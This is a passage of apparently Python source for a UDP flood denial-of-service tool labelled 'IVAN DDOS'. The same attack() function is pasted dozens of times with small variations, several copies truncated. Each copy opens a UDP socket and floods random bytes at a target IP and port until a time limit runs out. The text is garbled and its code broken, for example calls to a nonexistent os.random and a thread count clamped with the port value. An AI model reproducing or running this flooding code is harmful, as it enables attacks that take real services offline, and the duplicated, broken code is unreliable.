        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
